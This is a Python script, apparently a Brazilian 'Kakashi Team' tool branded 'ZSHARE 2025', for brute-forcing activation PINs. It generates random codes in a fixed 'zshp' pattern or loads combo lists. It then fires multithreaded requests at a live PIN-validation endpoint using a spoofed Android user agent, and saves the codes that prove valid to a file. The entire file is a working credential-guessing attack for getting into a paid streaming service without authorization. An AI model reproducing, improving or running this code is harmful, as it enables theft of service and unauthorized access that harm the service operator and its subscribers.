import random
import os
import sys
import requests
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore

# Inicializando o Colorama
init(autoreset=True)
# Configuração para evitar warnings de SSL
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
# Cria a estrutura de pastas necessária
os.makedirs('/sdcard/ZSHARE/COMBO/', exist_ok=True)

NAME = 'ZSHARE 2025'
sys.stdout.write(f"\033]2;{NAME}\007")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(Fore.CYAN + '''
    ▀█ █▀ █░█ ▄▀█ █▀█ █▀▀  ▀█ █▀█ ▀█ █▀    
    █▄ ▄█ █▀█ █▀█ █▀▄ ██▄  █▄ █▄█ █▄ ▄█    
    
      Cѳ∂¡gѳ Բ૯¡τѳ Pѳ૨ @MaxkakashiBr             
  ''')
clear()  # Limpa a tela
banner()  # Exibe o banner  

# Função para criar a pasta ZSHARE se ela não existir
def create_zshare_folder():
    folder_path = '/sdcard/ZSHARE'
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

def RandomString(suffix1=None, suffix2=None):
    alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
    prefix = 'zshp'
    prefix1 = '-'
    random_part = ''.join(random.choice(alphabet) for _ in range(4))
    if suffix1 is None or suffix1.strip() == '':
        suffix1 = random.choice(alphabet)
    if suffix2 is None or suffix2.strip() == '':
        suffix2 = random.choice(alphabet)
    return f'{prefix}{suffix1}{prefix1}{random_part}{suffix2}'

def make_request(user):
    url = f'https://hhh.eli5.cn/like/auth/getServiceName.php?pin={user}'
    headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_I001DA Build/N2G48B)'}
    try:
        response = requests.get(url, headers=headers, timeout=10)
        return response.text
    except requests.RequestException as e:
        logging.error(f'Request error for PIN {user}: {e}')
        return None

def check_result(result):
    if result is None:
        return 'Unknown'
    if 'INVALID_PIN' in result:
        return 'Failure'
    if '{"service":"' in result:
        return 'Success'
    return 'Unknown'

def write_to_file(user, is_valid):
    if is_valid:
        filepath = '/sdcard/ZSHARE/CÓDIGOS-[ZSHARE-2025].txt'
        with open(filepath, 'a') as file:
            file.write(f'\n╔══[┃▐▐ 𝐙𝐒𝐇𝐀𝐑𝐄 𝟐𝟎𝟐𝟓▐▐ ┃]══ \n║∘CONFIG BY {nome} \n║∘APK ➨ ZSHARE \n║∘CODIGO ➨ {user}\n╚══┃▐▐ ❝ 𝐊𝐚𝐤𝐚𝐬𝐡𝐢 𝐓𝐞𝐚𝐦 ❞ ▐▐ ┃═══\n')

def test_pin(user):
    result = make_request(user)
    key_check = check_result(result)
    if key_check == 'Success':
        logging.info(Fore.GREEN + f'CODIGO [ {user} ] VALIDO \033[0m')
        write_to_file(user, True)
    elif key_check == 'Failure':
        logging.info(Fore.RED + f'CODIGO [ {user} ] INVALIDO \033[0m')

def test_multiple_pins(num_pins, num_bots, suffix1=None, suffix2=None):
    tested_pins = set()
    with ThreadPoolExecutor(max_workers=num_bots) as executor:
        while len(tested_pins) < num_pins:
            user = RandomString(suffix1, suffix2)
            if user not in tested_pins:
                tested_pins.add(user)
                executor.submit(test_pin, user)

def select_combo_pins():
    clear()  # Limpa a tela
    banner()  # Exibe o banner
    combo_files = [f for f in os.listdir('/sdcard/ZSHARE/COMBO/') if f.endswith('.txt')]
    if combo_files:
        print(Fore.RED +"Arquivos de combo de PINs disponíveis:")
        for i, file in enumerate(combo_files):
            print(Fore.CYAN + f"{i + 1}. {file}")
        selection = int(input(Fore.RED + "Selecione o arquivo de combo de PINs: "))
        if 1 <= selection <= len(combo_files):
            return os.path.join('/sdcard/ZSHARE/COMBO/', combo_files[selection - 1])
        else:
            logging.error("Seleção inválida.")
            return None
    else:
        logging.error("Nenhum arquivo de combo de PINs encontrado.")
        return None

def ask_to_repeat(num_pins, num_bots):
    while True:
        again = input("\n\33[1;34m Deseja realizar outra operação?\n (S para sim, N para não): \33[1;32m").lower()
        if again == 's':
            main(num_pins, num_bots)  # Reinicia o processo
            break
        elif again == 'n':
            print("\33[1;32m\n KAKASHI A LENDA AGRADECE \n\n SAINDO DO PROGRAMA... \33[0m")
            break
        else:
            print("\33[1;31m Opção inválida. Por favor, digite 'S' ou 'N'. \33[0m")

def main(num_pins, num_bots):
    logging.basicConfig(level=logging.INFO, format='%(message)s')  # Alterado o formato do log
    create_zshare_folder()
    
    while True:
        try:
            num_bots = int(input(Fore.CYAN + 'Digite o número de bots a serem usados:\033[92m '))
            if num_bots <= 0:
                print("Por favor, insira um número positivo.")
                continue
            break
        except ValueError:
            print("Por favor, insira um número válido.")
    
    option = input(Fore.CYAN + 'Deseja testar um único PIN (s)\nGerar PINs para teste (g)\nOu usar um combo de PINs (c)? ')
    if option.lower() == 's':
        user = input(Fore.RED + 'Digite o PIN para testar:\033[92m ')
        test_pin(user)
    elif option.lower() == 'g':
        suffix1 = input(Fore.CYAN + 'Digite o primeiro sufixo (zshp(?)-****()\nOu pressione Enter para padrão aleatório:\033[92m ')
        suffix2 = input(Fore.CYAN + 'Digite o segundo sufixo (zshp()-****(?))\nOu pressione Enter para padrão aleatório:\033[92m ')
        while num_pins is None:
            try:
                num_pins = int(input(Fore.YELLOW + 'Número de Pins a serem gerados?\033[92m '))
            except ValueError:
                print('Por favor, insira um número válido.')
        test_multiple_pins(num_pins, num_bots, suffix1, suffix2)
    elif option.lower() == 'c':
        combo_file = select_combo_pins()
        if combo_file:
            with open(combo_file, 'r') as f:
                pins = f.readlines()
            with ThreadPoolExecutor(max_workers=num_bots) as executor:
                for pin in pins:
                    pin = pin.strip()
                    executor.submit(test_pin, pin)
    else:
        logging.info('Opção inválida.')

if __name__ == '__main__':
    nome = input(Fore.CYAN + "\n POR FAVOR INSIRA SEU NOME   \n\n\033[93m╰──➧ \033[92m ")
    num_pins = None
    num_bots = 5  # Valor padrão que será substituído pela entrada do usuário
    main(num_pins, num_bots)
    ask_to_repeat(num_pins, num_bots)  # Chama a função para perguntar se deseja repetir a operação